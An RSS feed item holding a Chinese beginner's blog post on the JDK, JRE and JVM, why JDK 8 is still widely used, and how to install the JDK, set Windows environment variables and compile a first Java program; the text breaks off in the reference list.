<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>JDK环境解析，安装和目的 - 咕咕狐</title>
<link>http://www.cnblogs.com/guguhu/p/14418911.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/guguhu/p/14418911.html</guid>
<description>&lt;p&gt;目录： 1. JDK环境解析及安装 2. 为什么使用JDK8 3.JDK的配置及目的&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;178.36150030459&quot;&gt;


&lt;p&gt;本篇将会介绍JDK的构成以及各部分的功能。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;JDK = JRE + 开发工具。&lt;br/&gt; &lt;br/&gt;JRE = JVM + 类库。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219185949799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;JDK粗略&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;11-jvm&quot;&gt;1.1 JVM&lt;/h2&gt;
&lt;p&gt;Java Virtual Machine (Java 虚拟机), 是一个虚构出来的计算机，能模拟计算机功能。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;JVM屏蔽了具体操作系统平台的信息,&lt;br/&gt;这就是Java的能够“一次编译，到处运行”的原因。&lt;br/&gt; &lt;br/&gt;JVM 将字节码解析为机器码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;12-jre&quot;&gt;1.2 JRE&lt;/h2&gt;
&lt;p&gt;Java Runtime Environment java 运行时环境，主要包括JVM和Java程序所需的核心类库lib等。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JRE = JVM + 类库。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在JDK的安装目录里可以找到JRE目录，里面有两个文件夹bin和lib。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;bin: binary 二进制文件，&lt;br/&gt;存放的是调试后可运行的文件。&lt;br/&gt; &lt;br/&gt;lib: library 类库，&lt;br/&gt;存放需要引用的类库 即 jar包。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;因为在解释.class文件的时候 JVM 需调用类库 lib (JRE里有运行.class文件的java.exe)，所以光有JVM不能执行.class文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;可以认为，&lt;br/&gt; &lt;br/&gt;bin里的是JVM。&lt;br/&gt; &lt;br/&gt;lib里的是JVM工作所需要的类库。&lt;br/&gt; &lt;br/&gt;JVM和 lib和起来就称为JRE。&lt;br/&gt; &lt;br/&gt;可以理解成虚拟机平台+虚拟机本体(JVM)的关系。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;JRE给普通用户提供了运行java文件的环境。&lt;/p&gt;
&lt;h2 id=&quot;13-jdk&quot;&gt;1.3 JDK&lt;/h2&gt;
&lt;p&gt;Java Development Kit java 开发工具,包括了JRE, Java开发工具（如编译器和调试器）和Java基础的类库。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;JDK = JRE + 开发工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在JDK安装目录下面有六个文件夹、一些声明文件、一个src.zip压缩文件。主要是bin、include、lib、 jre这四个文件夹起作用。&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;bin: 存放各种工具命令(如: 编译器 javac.exe)。&lt;br/&gt; &lt;br/&gt;include:  java和JVM交互用的头文件&lt;br/&gt; &lt;br/&gt;lib:  JDK工具命令的实际执行程序 (最终调用)&lt;br/&gt; &lt;br/&gt;jre:  JRE (java运行环境)&lt;br/&gt; &lt;br/&gt;db:  安装JavaDB的路径&lt;br/&gt; &lt;br/&gt;demo:  存放JDK提供的演示代码&lt;br/&gt; &lt;br/&gt;sample:  JDK提供的一些简单示例代码&lt;br/&gt; &lt;br/&gt;src.zip:  Java所有核心类库的源代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;总的来说JDK是用于java程序的开发, 而JRE则是只能运行.class文件而没有编译的功能。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219190002523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;JDK详细构成&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;常见使用流程：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;我们利用 JDK （调用 Java API 开发工具）编写出 Java 源代码，存储于 .java 文件中。&lt;br/&gt; &lt;br/&gt;JDK 中的编译器 javac 将 Java 源代码编译成 Java 字节码，存储于 .class 文件中。&lt;br/&gt; &lt;br/&gt;JRE 加载、验证、执行 Java 字节码。&lt;br/&gt; &lt;br/&gt;JVM 将字节码解析为机器码并映射到 CPU 指令集或 OS 的系统调用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;强调：&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;JDK有 javac.exe , JRE没有。&lt;br/&gt;(javac指令是用来将java文件编译成class文件的，这是开发者需要的， 而用户是不需要的。)&lt;br/&gt; &lt;br/&gt;JDK是开发环境，JRE是运行环境。&lt;/p&gt;
&lt;p&gt; &lt;br/&gt;JVM 本身不能执行 .class 文件，需要 JRE 下的 lib 类库的支持。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;21-为什么使用jdk8&quot;&gt;2.1 为什么使用JDK8&lt;/h2&gt;
&lt;h3 id=&quot;211-更新&quot;&gt;2.1.1 更新&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;Oracle平均每隔6个月就发布一个新版本，导致很多人对上个版本都没精通，下个版本就已经发布了。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;212-稳定&quot;&gt;2.1.2 稳定&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;软件需要的就是稳定，对于不是人人都使用最新版的情况。大环境倾向于使用JDK8。(新版本可以兼容旧版本，而旧版本不能运行新版本)&lt;br/&gt; &lt;/li&gt;
&lt;li&gt;新版本不稳定，对于出现的每一个小bug都会消耗很多精力去解决。&lt;br/&gt; &lt;/li&gt;
&lt;li&gt;对于已完成的项目软件来说，更新极有可能导致很多未知的运行时错误和编译器错误。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h3 id=&quot;213-需求&quot;&gt;2.1.3 需求&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;JDK8使用时间已久，大大小小的特性，bug 都摸清楚了，用起来更方便。&lt;br/&gt; &lt;/li&gt;
&lt;li&gt;如果出现了一些不可修复问题，而如果能够回退版本就能解决的话，那么很多时候的选择是回退版本。&lt;br/&gt; &lt;/li&gt;
&lt;li&gt;JDK8完全可以满足需要，新版本没有改革性的更新 (没有改变版本的核心动力)。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;以下摘抄自知乎&lt;br/&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/139274956&quot; target=&quot;_blank&quot;&gt;https://zhuanlan.zhihu.com/p/139274956&lt;/a&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;在Java8之前，用户接受更高版本的Java的过程非常缓慢，想要跟上每六个月就要升级的步伐，实在是太难了。&lt;br/&gt; &lt;br/&gt;对于企业来说，这种升级分分钟会带来兼容性的致命问题，风险也是非常大的，尤其面对庞大而又复杂项目。&lt;br/&gt; &lt;br/&gt;而且JDK是个非常核心的基础设施，除了安全漏洞，基本上是不会再去动生产环境JDK了，而且出了安全事故谁也承担不了这个责任。&lt;br/&gt; &lt;br/&gt;在这么多的版本中，只有Java8、Java11和未来的Java17是长期支持版本（LTS），Oracle会支持3年，其他的只会支持6个月，新版本一出，就放弃老版本的技术支持，这也是很少有人使用9～14的版本的原因。&lt;br/&gt; &lt;br/&gt;那程序员们还有必要学习Java的新版本吗？&lt;br/&gt; &lt;br/&gt;我认为是有必要的。&lt;br/&gt; &lt;br/&gt;从技术来看：Java小版本更新基本上都是修复各种漏洞和bug，不会去改变现有的JDK，JDK其实都差不多，我们只需要知道它新增了什么功能而已，从这一点来看其实也增加不了很多的学习成本。&lt;br/&gt; &lt;br/&gt;当Java大版本的更新，比如JDK7-&amp;gt;JDK8，会增加一些新特性，花几个小时看看realse&lt;br/&gt;note就可以完成学习了，同样花不了程序员们的很多时间。&lt;br/&gt; &lt;br/&gt;从个人来看：虽然很多公司还在用JDK6-7-8，但是我们更应该关注的是自身的知识基础和学习能力，不要因为现在公司的Java技术停留在某个版本上面而放弃学习，我们可以不为企业更新Java版本，但我们要为自己的知识深度与广度学习更多的Java知识。&lt;br/&gt;如果你只会Java1.7，那么你的求职范围只能在使用Java1.7的公司中，一个用得上Java8、11、12的公司为什么要招一个连Java8都不会的人呢？&lt;br/&gt; &lt;br/&gt;除了留意版本更新，程序员们同时要留意基于Java的一些流行框架和新技术，比如近几年兴起的SpringBoot、SpringCloud等。&lt;br/&gt; &lt;br/&gt;一句话就可以概括：企业升不升级是他的事，你学不学是你的事。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;22-安装jdk&quot;&gt;2.2 安装JDK&lt;/h2&gt;
&lt;p&gt;本篇提供官网渠道和网盘下载。各位按照自己需求自行选择。&lt;/p&gt;
&lt;h3 id=&quot;221-官网下载&quot;&gt;2.2.1. 官网下载&lt;/h3&gt;
&lt;p&gt;下载是要账号的，如果没有的话可以注册一个。&lt;/p&gt;
&lt;p&gt;下载的时候会有提示。&lt;/p&gt;
&lt;p&gt;首页: &lt;a href=&quot;https://www.oracle.com/index.html&quot; target=&quot;_blank&quot;&gt;https://www.oracle.com/index.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/202102191224451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;ORACLE首页&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;选择JDK版本的界面：&lt;br/&gt;&lt;a href=&quot;https://www.oracle.com/java/technologies/javase-downloads.html&quot; target=&quot;_blank&quot;&gt;https://www.oracle.com/java/technologies/javase-downloads.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当前看到的是JDK15，把界面往下翻，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219110752825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;下载界面15&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;一直翻到JDK8 ，选择JDK下载。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219122917151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;JDK8&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;这里选自己需要的版本。我下的是 windows-x64。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219123824868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;JDK对应的操作系统&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;同意弹出的提示后下载。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219124941493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;下载确认&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;222-网盘下载&quot;&gt;2.2.2. 网盘下载&lt;/h3&gt;
&lt;blockquote readability=&quot;1.7808219178082&quot;&gt;
&lt;p&gt;链接：&lt;a href=&quot;https://pan.baidu.com/s/1LgFhwr0-ur_sZEJZCrLh-Q&quot; target=&quot;_blank&quot;&gt;https://pan.baidu.com/s/1LgFhwr0-ur_sZEJZCrLh-Q&lt;br/&gt;&lt;/a&gt; 提取码：m6bg&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;安装JDK的时候根据提示进行下一步就好了，安装位置建议放在C盘以外的地址。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219133345400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;更改地址&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-配置环境变量&quot;&gt;3.1 配置环境变量&lt;/h2&gt;
&lt;h3 id=&quot;311-配置java_home&quot;&gt;3.1.1 配置JAVA_HOME&lt;/h3&gt;
&lt;p&gt;右击此电脑/我的电脑-&amp;gt;属性-&amp;gt;高级-&amp;gt;环境变量-&amp;gt;系统变量-&amp;gt;新建&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219133734877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;环境变量&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;变量名: JAVA_HOME&lt;/p&gt;
&lt;p&gt;变量值: JDK的安装地址&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219134235294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;输入完成之后点确认&lt;/p&gt;
&lt;h3 id=&quot;312-配置path&quot;&gt;3.1.2. 配置PATH&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;找到path，双击或者点编辑-&amp;gt;新建&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219143244604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;输入： %JAVA_HOME%\bin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;点确定保存。&lt;/p&gt;
&lt;h3 id=&quot;313-配置classpath&quot;&gt;3.1.3 配置CLASSPATH&lt;/h3&gt;
&lt;p&gt;这一步了解就好，原因在后面会讲到。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;变量名: CLASSPATH&lt;/p&gt;
&lt;p&gt;变量值: .;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219142846229.png#pic_center&quot; alt=&quot;CLASSPATH&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;点确定保存变量&lt;/p&gt;
&lt;h2 id=&quot;32-测试环境变量&quot;&gt;3.2. 测试环境变量&lt;/h2&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;快捷键 “win + R”   -&amp;gt;  输入cmd  -&amp;gt;  确定&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219144832622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;cmd&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;在命令窗口输入: java -version&lt;br/&gt;-&amp;gt; 按回车&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219145027747.png&quot; alt=&quot;java-version&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;配置成功。&lt;/p&gt;
&lt;h2 id=&quot;33-编写第一个java程序&quot;&gt;3.3 编写第一个java程序&lt;/h2&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;创建一个后缀为.java的文件（尽量在纯英文文件夹下），&lt;br/&gt; &lt;br/&gt;如果不会的话可以 查看-&amp;gt;勾上文件拓展名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219145749393.png&quot; alt=&quot;改后缀名1&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;新建文本文档 -&amp;gt; 右键重命名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219145622540.png&quot; alt=&quot;改后缀名2&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;有提示直接确认就可以了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219150205554.png&quot; alt=&quot;改后缀名3&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;创建成功。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219150103843.png&quot; alt=&quot;改后缀名4&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;在里面写入测试代码。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class Test{ //class后面的单词要与文件名保持一致

  public static void main(String args[]){

    System.out.println(&quot;Hello world!&quot;);
    } }
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;保存。&lt;br/&gt;再次打开命令窗口（“ win + R ”   -&amp;gt;  输入cmd  -&amp;gt;  确定）。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;在命令窗口输入 D: //文件所在的硬盘位置
-&amp;gt;回车
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219235413778.png&quot; alt=&quot;切盘符&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;在命令窗口输入： cd+空格+文件位置&lt;br/&gt; &lt;br/&gt;不知道 .java 文件的地址，可以直接点文件管理器上方的文件夹图标即可显示路径&lt;br/&gt;然后复制&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219152325591.png&quot; alt=&quot;复制文件位置&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;在命令窗口输入：cd D:\dd\test   //文件位置  
-&amp;gt;回车
在命令窗口输入：javac Test.java //编译文件
-&amp;gt;回车
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;执行成功之后, 在相同的目录下会有一个Test.class文件，&lt;br/&gt; &lt;br/&gt;这是编译之后给计算机看的文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219152613671.png&quot; alt=&quot;编译&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;在命令窗口输入：                java HelloWorld
-&amp;gt;回车
命令窗口会打印/显示:     Hello World！
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20210219235712963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTc5ODI2Mw==,size_16,color_FFFFFF,t_70&quot; alt=&quot;编码过程&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;编码完成。&lt;/p&gt;

&lt;p&gt;配置环境变量的目的很简单：为了在命令行窗口(dos)下编译和运行Java程序。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;由于java开发命令不属于Windows本身命令，所以需要进行路径配置才可以使用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;41-配置java_home环境变量目的&quot;&gt;4.1 配置JAVA_HOME环境变量目的&lt;/h2&gt;
&lt;p&gt;JAVA_HOME环境变量指向 JDK 的安装目录。&lt;/p&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;方便引用-&amp;gt;把路径配置在 JAVA_HOME 里，PATH 可以直接引用 %JAVA_HOME% 。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;归一原则-&amp;gt;当JDK路径发生改变时, 仅需更改JAVA_HOME的变量值。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;约定协议-&amp;gt;一些常用的 java开发软件 (比如Eclipse) 都是默认通过搜索 JAVA_HOME 变量来找到并使用JDK的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;42-配置path环境变量目的&quot;&gt;4.2 配置PATH环境变量目的&lt;/h2&gt;
&lt;p&gt;现在知道了.java 文件需要先转换成 .class 文件才能被电脑识别，&lt;/p&gt;
&lt;p&gt;也就是 源文件 -&amp;gt; 二进制字节码,&lt;/p&gt;
&lt;p&gt;而我们在命令窗口用到的java命令,如&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;javac 把.java文件编译成.class文件。&lt;br/&gt; &lt;br/&gt;java 运行.class文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;这些命令都是通过我们配置的PATH环境变量找到相应的 (bin文件夹中)&lt;br/&gt;java.exe和javac.exe文件，计算机才能正确识别并执行我们输入的java命令。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;配置完成之后，操作系统就可以调用 javac.exe 和 bin 文件夹下其它的可执行文件，包括执行Java程序的java.exe。&lt;br/&gt; &lt;br/&gt;path是Windows查找.exe文件的路径&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;43-配置classpath环境变量目的&quot;&gt;4.3 配置CLASSPATH环境变量目的&lt;/h2&gt;
&lt;p&gt;在java开发过程中，我们会用到很多自带的标准类库，所以告诉计算机如何找到它们是必须的。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;将Java源程序编译成.class文件之后，才可以执行Java程序。&lt;br/&gt; &lt;br/&gt;而执行Java程序需要让虚拟机（JVM）知道.class文件的位置并导到内存&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;&lt;li&gt;JVM就是通过CLASSPATH来寻找类的。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;变量的值: .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;&lt;br/&gt; &lt;br/&gt;“.”     当前目录&lt;br/&gt; &lt;br/&gt;dt.jar    运行环境的类库&lt;br/&gt; &lt;br/&gt;tools.jar   工具类库&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;没有以上两个类库的支持，很多Java程序就无法运行。&lt;/p&gt;
&lt;p&gt;启动jvm的时候，jvm会根据classpath环境变量所保存的路径信息下去寻找对应的class文件。而自JDK1.5以后，JRE能自动搜索目录下类文件，并且加载dt.jar和tool.jar的类。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;CLASSPATH 是jvm查找.class文件的路径。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在，很多IDE(集成开发环境)不需要配置环境变量，也能正确编译和运行Java程序。&lt;/p&gt;
&lt;p&gt;我们只需要在IDE (如: IDEA) 当中相关的配置菜单下，正确的指定出JDK的安装路径就可以了。&lt;/p&gt;
&lt;p&gt;总结：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;JAVA_HOME 配置提供JDK的按照目录。&lt;br/&gt; &lt;br/&gt;PATH 配置提供的是java的编译环境。&lt;br/&gt; &lt;br/&gt;CLASSPATH 配置提供的是java的运行环境。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;有什么建议都欢迎发到评论区讨论，每一条留言我都会看的。&lt;/p&gt;
&lt;p&gt;参考资料:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol readability=&quot;0.029197080291971&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/139274956&quot; target=&quot;_blank&quot;&gt;都2020年了，我还在用Java8！&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://www.zhihu.com/question/325293339&quot; target=&quot;_blank&quot;&gt;为什么很多公司选择不升级JDK版本，仍然使用JDK8？&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_39622905/article/details/109763001?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161375514516780271572594%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;amp;request_id=161375514516780271572594&amp;amp;biz_id=0&amp;amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-109763001.pc_search_result_cache&amp;amp;utm_term=java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E7%9A%84%E7%9B%AE%E7%9A%84%E4%B8%8E%E4%BD%9C%E7%94%A8&quot; target=&quot;_blank&quot;&gt;java变量设置_java环境变量的详细配置&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
